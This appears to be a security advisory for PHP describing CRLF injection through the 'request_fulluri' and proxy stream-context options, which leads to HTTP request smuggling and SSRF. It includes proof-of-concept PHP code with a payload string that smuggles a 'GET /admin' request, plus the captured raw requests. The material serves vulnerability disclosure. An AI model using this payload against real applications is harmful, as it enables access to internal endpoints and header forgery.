## Description

### Summary

Configuring a proxy in a [stream context](https://www.php.net/manual/en/stream.contexts.php) might allow for CRLF injection in URIs, resulting in HTTP request smuggling attacks.

### Details

When creating a stream using one of the available stream creation functions (e.g., `fopen`, `file`, `file_get_contents`...), developers can specify a custom stream context containing a set of parameters to use during the connection. One such parameter, in the case of HTTP and FTP streams, is `proxy`. The HTTP context options also include a `request_fulluri` boolean, which is required by some proxies to correctly forward the request.

While a normal request to `http://example.com/path/to/file?query` would results in the following HTTP request:

```
GET /path/to/file?query HTTP/1.1
```

when setting `request_fulluri` to `true` we obtain:

```
GET http://example.com/path/to/file?query HTTP/1.1
```

The vulnerability lies in the [implementation of `request_fulluri`](https://github.com/php/php-src/blob/0d616d1b82ca7609a7ece762cb8688d9bed74370/ext/standard/http_fopen_wrapper.c#L393), which just inserts the raw URI into the HTTP request line. In particular, this bypasses the normal [control characters sanitization](https://github.com/php/php-src/blob/0d616d1b82ca7609a7ece762cb8688d9bed74370/ext/standard/url.c#L53) usually performed [when parsing the URL](https://github.com/php/php-src/blob/0d616d1b82ca7609a7ece762cb8688d9bed74370/ext/standard/url.c#L323).

This means that, if the resource URI is under the partial control of an attacker, when the `request_fulluri` context parameter is true, a malicious actor could inject CRLF characters to perform a HTTP request smuggling attack.

Furthermore, if a non-HTTP stream sets a `proxy` parameter in the context (right now only the FTP context supports this), the `request_fulluri` parameter gets [automatically silently enabled](https://github.com/php/php-src/blob/0d616d1b82ca7609a7ece762cb8688d9bed74370/ext/standard/http_fopen_wrapper.c#L164) without the developer ever knowing.

Notice that, in the case of HTTP streams, setting a proxy is not strictly necessary, as the real issue is the `request_fulluri` parameter.

### PoC

We can test the raw query performed by PHP by simply using netcat in listening mode (`nc -lvnp 1337`).

When no proxy is configured, the malicious input is correctly sanitized (still producing an error due to the presence of unencoded spaces):

```
$userinput = " HTTP/1.1\r\nHost: localhost:1337\r\n\r\nGET /admin HTTP/1.1\r\nHost: adminpanel\r\n\r\nGET /";

file_get_contents("http://localhost:1337/$userinput");
```

```
GET / HTTP/1.1__Host: localhost:1337____GET /admin HTTP/1.1__Host: adminpanel____GET / HTTP/1.1
Host: localhost:1337
Connection: close
```

When using a proxy and setting `request_fulluri` to `true`, we get request smuggling:

```
$opts = ['http' => ['proxy' => 'tcp://localhost:1337', 'request_fulluri' => true]];
$context = stream_context_create($opts);

$userinput = " HTTP/1.1\r\nHost: localhost:1337\r\n\r\nGET /admin HTTP/1.1\r\nHost: adminpanel\r\n\r\nGET /";

file_get_contents("http://localhost:1337/$userinput", false, $context);
```

```
GET http://localhost:1337/ HTTP/1.1
Host: localhost:1337

GET /admin HTTP/1.1
Host: adminpanel

GET / HTTP/1.1
Host: localhost:1337
Connection: close
```

This also happens with HTTP proxies on FTP, without the `request_fulluri` parameter:

```
$opts = ['ftp' => ['proxy' => 'tcp://localhost:1337']];
$context = stream_context_create($opts);

$userinput = " HTTP/1.1\r\nHost: localhost:1337\r\n\r\nGET /admin HTTP/1.1\r\nHost: adminpanel\r\n\r\nGET /";

file_get_contents("ftp://localhost:1337/$userinput", false, $context);
```

```
GET ftp://localhost:1337/ HTTP/1.1
Host: localhost:1337

GET /admin HTTP/1.1
Host: adminpanel

GET / HTTP/1.1
Host: localhost:1337
Connection: close
```
### Impact

CLRF injection in the URI leads to Server Side Request Forgery attacks (SSRF), which allows an attacker to bypass security controls, access internal endpoints, and, since we control the `Host:` header, potentially access different hosts or machines.

Crafted requests can use any HTTP method and set any header to any value, including sensitive headers like `Authorization`, `Cookie`, `Origin`, or `Referer`.

Moreover, in some setups, the attacker might be able to read the HTTP response of each of the smuggled request.
